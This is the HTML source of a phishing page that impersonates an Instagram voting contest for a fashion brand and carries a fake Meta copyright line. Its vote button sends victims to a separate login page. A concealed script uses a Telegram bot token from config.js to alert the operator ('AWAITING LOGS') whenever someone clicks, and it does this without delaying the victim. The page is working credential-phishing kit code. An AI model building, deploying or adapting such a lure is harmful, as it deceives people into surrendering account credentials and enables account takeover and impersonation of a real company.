<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fashion Brand - Vote</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Load your Telegram config -->
  <script type="module" src="config.js"></script>
</head>
<body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
  <div class="w-full max-w-md">

    <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
      <!-- Header -->
      <div class="relative h-56">
        <img 
          src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800&h=400&fit=crop" 
          alt="Fashion Store"
          class="w-full h-full object-cover"
        />
        <div class="absolute inset-0 bg-black/30"></div>
        <h1 class="absolute bottom-6 left-6 text-white text-3xl md:text-4xl font-bold tracking-wide">
          THE PEOPLE'S PICK
        </h1>
      </div>

      <!-- Content -->
      <div class="p-6 md:p-8">
        <div class="flex items-center gap-4 mb-6">
          <!-- Badge -->
          <div class="relative flex-shrink-0">
            <svg class="w-16 h-16 text-blue-500" viewBox="0 0 100 100">
              <circle cx="50" cy="50" r="35" fill="currentColor"/>
              <line x1="50" y1="15" x2="50" y2="5"   stroke="currentColor" stroke-width="3"/>
              <line x1="65"  y1="20" x2="72" y2="14"  stroke="currentColor" stroke-width="3"/>
              <line x1="75"  y1="32" x2="84" y2="29"  stroke="currentColor" stroke-width="3"/>
              <line x1="80"  y1="48" x2="90" y2="48"  stroke="currentColor" stroke-width="3"/>
              <line x1="75"  y1="64" x2="84" y2="67"  stroke="currentColor" stroke-width="3"/>
              <line x1="65"  y1="76" x2="72" y2="82"  stroke="currentColor" stroke-width="3"/>
              <line x1="50"  y1="81" x2="50" y2="91"  stroke="currentColor" stroke-width="3"/>
              <line x1="35"  y1="76" x2="28" y2="82"  stroke="currentColor" stroke-width="3"/>
              <line x1="25"  y1="64" x2="16" y2="67"  stroke="currentColor" stroke-width="3"/>
              <line x1="20"  y1="48" x2="10" y2="48"  stroke="currentColor" stroke-width="3"/>
              <line x1="25"  y1="32" x2="16" y2="29"  stroke="currentColor" stroke-width="3"/>
              <line x1="35"  y1="20" x2="28" y2="14"  stroke="currentColor" stroke-width="3"/>
            </svg>
            <div class="absolute inset-0 flex items-center justify-center">
              <div class="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center">
                <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
                </svg>
              </div>
            </div>
          </div>

          <div>
            <h2 class="text-2xl md:text-3xl font-bold text-gray-800">FASHION BRAND</h2>
            <p class="text-gray-500 mt-1">118 votes â€¢ #3</p>
          </div>
        </div>

        <p class="text-gray-700 leading-relaxed mb-8">
          I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker.
        </p>

        <a href="login.html" id="vote-btn"
           class="block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-3">
          <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
            <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
            <circle cx="12" cy="12" r="3.5" fill="none" stroke="white" stroke-width="1.5"/>
            <circle cx="17" cy="7" r="1.5" fill="white"/>
          </svg>
          Vote on Instagram
        </a>
      </div>
    </div>

    <p class="text-center text-gray-400 text-sm mt-6">
      Â© 2025 Meta.
    </p>

  </div>

  <!-- Telegram alert script -->
  <script type="module">
    // Wait for config.js to load
    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';

    document.addEventListener('DOMContentLoaded', () => {
      const voteButton = document.getElementById('vote-btn');

      if (voteButton && TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
        voteButton.addEventListener('click', (e) => {
          // We don't preventDefault() â†’ user still goes to login.html
          
          const message = "LOGIN BUTTON CLICKEDðŸš¨ðŸ””\nðŸ˜ˆAWAITING LOGSâ€¦..";

          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: message,
              parse_mode: 'HTML'
            })
          })
          .catch(err => console.log('Telegram send failed:', err));
          // Fire-and-forget â€” no delay for the user
        });
      }
    });
  </script>

</body>
</html>
